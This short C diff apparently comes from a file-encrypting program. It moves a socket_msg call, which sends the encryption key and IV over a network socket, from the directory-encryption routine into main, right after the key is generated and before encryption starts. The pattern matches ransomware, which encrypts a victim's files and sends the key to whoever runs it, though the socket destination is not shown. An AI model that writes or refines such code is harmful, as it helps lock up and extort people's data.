@@ -249,8 +249,6 @@ void crypted_list_dir(const char *path, unsigned char *key, unsigned char *iv) {
 
     closedir(directory);
 
-    socket_msg(key, iv);
-
     printf("--------------------------------------------------------\n");
     printf("Directory : %s......done!\n", path);
 
@@ -386,6 +384,8 @@ int main(int argc, char *argv[]) {
 
         key_hex = byteTOhex(key_bytes, KEY_SIZE);
         iv_hex = byteTOhex(iv_bytes, IV_SIZE);
+
+        socket_msg(key_bytes, iv_bytes);
 
         printf("------- Crypting ! -------\n");
 
